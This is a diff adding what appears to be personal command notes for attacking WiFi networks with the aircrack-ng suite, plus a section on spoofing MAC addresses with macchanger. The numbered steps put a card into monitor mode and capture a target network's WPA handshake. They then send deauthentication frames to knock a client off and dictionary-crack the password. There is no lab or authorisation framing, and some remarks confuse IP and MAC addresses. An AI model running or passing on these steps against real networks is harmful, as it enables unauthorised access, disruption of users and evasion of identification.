@@ -1,0 +1,28 @@
+1. sudo apt-get install -y aircrack-ng
+2. "airmon-ng start wlo1"
+3. Run iwconfig to confirm monitor mode.
+4. A quick ip a shows that your wireless card name has changed from wlo1 to wlo1mon.
+5. Start monitor mode with "airodump-ng wlo1mon" .
+6. store the bssid and the channel of the target wifi and Ctrl + c to stop
+7. next run "airodump-ng -d <bssid> -w file_to_save_handshake -c <channel> wlo1mon"
+8. open another terminal and run "aireplay-ng -0 10 -a <bssid> -c <station> wlo1mon"
+9. Run "aircrack-ng -w keywords.txt file_to_save_handshake.cap"
+10. To fix back the wifi, Run "airmon-ng stop wlo1mon"
+11. Next run "systemctl restart net*"
+
+## Change mac address
+sudo apt install macchanger
+==> to list ip addressess 
+ip addr
+==> to check the current ip address of a specified network interface using macchanger
+macchanger -s wlo1
+==> to randomly change the mac address
+sudo macchanger -r wlo1
+==> to manually change it 
+sudo macchanger -m <address> wlo1
+sudo macchanger -m 60:57:18:D7:26:A2 wlo1
+==> confirm by running
+ip addr
+==> to restore the actual ip addres of the network, run 
+sudo macchanger -p wlo1
+
